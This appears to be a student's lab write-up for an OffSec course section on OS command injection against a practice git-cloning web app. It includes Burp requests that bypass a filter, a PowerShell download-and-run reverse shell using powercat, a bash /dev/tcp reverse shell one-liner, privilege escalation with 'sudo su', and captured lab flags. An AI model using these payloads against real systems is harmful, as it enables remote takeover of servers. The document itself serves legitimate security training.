The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@0e7132f89012:~# ls
flag.txt
root@0e7132f89012:~# cat flag.txt 
OS{0bc79f04ce6be2821cccba21f60cb644}
```

##### 9.4 Command Injection

```
    Learn about command injection in web applications 
    ```
    
```
    Use operating system commands for OS command injection 
    ```
    
```
    Understand how to leverage command injection to gain system access 
    ```
    

#### OS Command Injection

When a well defined API is not implemented and a web app needs to address a large number of cases, developers may accept user input then sanitze it.

- User input accepted
- filtered for command sequences

Navigate to http://192.168.220.189:8000, the MountainVault site is desinged to clone git repos.

- it allows git commands, but filters `ifconfig`, `ipconfig`, etc.
- `git help` yeilds valid output, so we may be able to utilize all git commands.

With curl;

```bash
kali@kali:~$ curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive

Command Injection detected. Aborting...%!(EXTRA string=ipconfig) 
```

With Burp, running `git version` we find a Win box.

```http
POST /archive HTTP/1.1
Host: 192.168.220.189:8000
Content-Length: 19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.220.189:8000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.220.189:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

Archive=git+version
```

This string is included in Win builds of git when run with `version` param.

```http
HTTP/1.1 200 OK
Date: Sun, 27 Aug 2023 22:20:58 GMT
Content-Length: 98
Content-Type: text/plain; charset=utf-8
Connection: close

Repository successfully cloned with command: git version and output: git version 2.36.1.windows.1
```

Now that we know it runs Win, poke around.

- seperate multiple commands with `;`
    - URL encode `%3B`
- Can also delimit commands with `&` and `&&` for bash/powershell
    - NOTE Win CMD `&`

```http
POST /archive HTTP/1.1
Host: 192.168.220.189:8000
Content-Length: 30
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.220.189:8000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.220.189:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

Archive=git+version%3Bipconfig
```

Interesting results!

```http
HTTP/1.1 200 OK
Date: Sun, 27 Aug 2023 22:23:50 GMT
Content-Length: 377
Content-Type: text/plain; charset=utf-8
Connection: close

Repository successfully cloned with command: git version;ipconfig and output: git version 2.36.1.windows.1

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.220.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.220.254
```

What we can assume, is the filter checks if `git` is executed and little else, leverage it and find out more about the env. This will determine if CMD or PS is exec.

```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

```bash
┌──(operator㉿labhost)-[~/OffSec]
└─$ urlencode '(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell'

%28dir%202%3E%261%20%2A%60%7Cecho%20CMD%29%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
```

In Burp;

```http
POST /archive HTTP/1.1
Host: 192.168.220.189:8000
Content-Length: 110
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.220.189:8000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.220.189:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

Archive=git+version%3B%28dir%202%3E%261%20%2A%60%7Cecho%20CMD%29%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
```

Retruns;

```http
HTTP/1.1 200 OK
Date: Sun, 27 Aug 2023 22:33:38 GMT
Content-Length: 161
Content-Type: text/plain; charset=utf-8
Connection: close

Repository successfully cloned with command: git version;(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 and output: git version 2.36.1.windows.1
PowerShell
```

Looks like PowerShell. Obtain a reverse shell with `powercat` , the powershell implementation of netcat included in Kali. Copy it to working dir and serve it with Python.

```bash
┌──(operator㉿labhost)-[~/OffSec/shells]
└─$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/shells]
└─$ ls
powercat.ps1
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/shells]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Start the local netcat listener;

```bash
┌──(operator㉿labhost)-[~/OffSec]
└─$ nc -nvlp 4444                        
listening on [any] 4444 ...
```

Powercat served and netcat listening, time to inject our command.

```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```

URL encode as usual;

```bash
┌──(operator㉿labhost)-[~/OffSec/shells]
└─$ urlencode 'IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.223/powercat.ps1");powercat -c 192.168.45.223 -p 4444 -e powershell'
IEX%20%28New-Object%20System.Net.Webclient%29.DownloadString%28%22http%3A%2F%2F192.168.45.223%2Fpowercat.ps1%22%29%3Bpowercat%20-c%20192.168.45.223%20-p%204444%20-e%20powershell
```

Burp req;

```http
POST /archive HTTP/1.1
Host: 192.168.220.189:8000
Content-Length: 110
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.220.189:8000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.220.189:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

Archive=git+version%3BIEX%20%28New-Object%20System.Net.Webclient%29.DownloadString%28%22http%3A%2F%2F192.168.45.223%2Fpowercat.ps1%22%29%3Bpowercat%20-c%20192.168.45.223%20-p%204444%20-e%20powershell
```

Netcat shell returned;

```bash
┌──(operator㉿labhost)-[~/OffSec]
└─$ nc -nvlp 4444                        
listening on [any] 4444 ...
connect to [192.168.45.223] from (UNKNOWN) [192.168.220.189] 55266
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator\Documents\meteor> 
```

Instead of using Powercat, we could also inject a PowerShell reverse shell directly. There are many ways to exploit a command injection vulnerability that depend heavily on the underlying operating system and the implementation of the web application, as well as any security mechanisms in place.

#### OS Command Injection Exercises

Follow the steps above and exploit the command injection vulnerability on VM #1 to obtain a reverse shell. Since the machine is not connected to the internet, you have to skip the step of cloning the repository from the beginning of this section. Find the flag on the Desktop for the Administrator user.

```bash
┌──(operator㉿labhost)-[~/OffSec]
└─$ nc -nvlp 4444                        
listening on [any] 4444 ...
connect to [192.168.45.223] from (UNKNOWN) [192.168.220.189] 55266
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator\Documents\meteor> cd ..\..\Desktop
cd ..\..\Desktop
PS C:\Users\Administrator\Desktop> dir
dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         8/27/2023   3:03 PM             38 secrets.txt                                                          


PS C:\Users\Administrator\Desktop> cat secrets.txt
cat secrets.txt
OS{f751a1dd339b150229843909b737bcc7}
```

For this exercise the Mountain Vaults application runs on Linux (VM #2). Exploit the command injection vulnerability like we did in this section, but this time use Linux specific commands to obtain a reverse shell. As soon as you have a reverse shell use the sudo su command to gain elevated privileges. Once you gain elevated privileges, find the flag located in the /opt/config.txt file.
`http://192.168.220.16`

Burp captured request, sent to repeater;

```http
POST /archive HTTP/1.1
Host: 192.168.220.16
Content-Length: 19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.220.16
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.220.16/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

Archive=git+version
```

Returns;

```http
HTTP/1.1 200 OK
Date: Sun, 27 Aug 2023 23:16:17 GMT
Content-Length: 88
Content-Type: text/plain; charset=utf-8
Connection: close

Repository successfully cloned with command: git version and output: git version 2.20.1
```

Looks like Linux host, poke around and break stuff. The one liner;

```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

URL encode, start listener, send request;

```bash
┌──(operator㉿labhost)-[~/OffSec/shells]
└─$ urlencode 'bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"'
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

Burp, add to request with `%3B` for `;`;

```http
POST /archive HTTP/1.1
Host: 192.168.220.16
Content-Length: 19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.220.16
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.220.16/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

Archive=git+version%3Bbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.223%2F4444%200%3E%261%22
```

Shell returned;

```bash
┌──(operator㉿labhost)-[~/OffSec/shells]
└─$ nc -nvlp 4444                        
listening on [any] 4444 ...
connect to [192.168.45.223] from (UNKNOWN) [192.168.220.16] 50532
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
stanley@c95818fc2884:/app$ sudo su
sudo su
cat /opt/config.txt
OS{f421330abb4760d03c21d838884fbfa2}
```

